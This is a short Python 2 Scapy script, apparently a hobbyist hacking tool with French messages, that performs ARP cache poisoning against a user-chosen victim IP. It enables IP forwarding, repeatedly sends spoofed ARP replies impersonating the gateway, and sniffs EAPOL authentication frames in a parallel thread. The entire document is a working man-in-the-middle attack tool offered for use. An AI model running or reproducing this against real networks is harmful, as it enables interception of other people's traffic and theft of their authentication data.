#!/usr/bin/python

from scapy.all import *
import time, sys, select, os
import threading

print "#####################################################################"
print "On se fait un rail de trames ip ?"
print "Ok, let's go baby"
print "@author : @cyb0rgames"
print "##################################################################### \n"



if os.getuid() != 0 :
    print "#####################################################################"
    print "vous devez etre root pour executer ce script"
    print "##################################################################### \n"
    exit ()

def arpspoof():
    while 1:
        send(arp)
        time.sleep(1)
        if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
            line = raw_input()
            break

def snifsnif():
    while 1:
        print"coucou sniff"
        sniff(filter="ether proto 0x888e",iface="eth0", count = 1)
        time.sleep(1)
        if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
            line = raw_input()
            break

subprocess.check_output("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)


op=2
list_interfaces = subprocess.check_output("ls /sys/class/net", shell=True)
print "interface disponible : \n%s"  %(list_interfaces)
interface=raw_input("quel est interface utilise ? : ")
commande=("ifconfig -a | grep %s | grep HWaddr | awk '{print $5}'") %(interface)
mac = subprocess.check_output(commande, shell=True)
list_router = subprocess.check_output("route -n | grep 0.0.0.0 | awk '{print $2}' | grep -v 0.0.0.0", shell=True)
print "gateway disponible : \n%s" %(list_router)
spoof=raw_input("quel est router utilise ? : ")
victim=raw_input("adresse ip de la victime : ")


print "ip victime : %s, ip passerelle : %s, mac adresse : %s" %(victim,spoof,mac)

arp=ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)


print "appuyer sur une entree pour quitter"

poisonning = threading.Thread(target=arpspoof)
poisonning.start()

sniffing = threading.Thread(target=snifsnif)
sniffing.start()
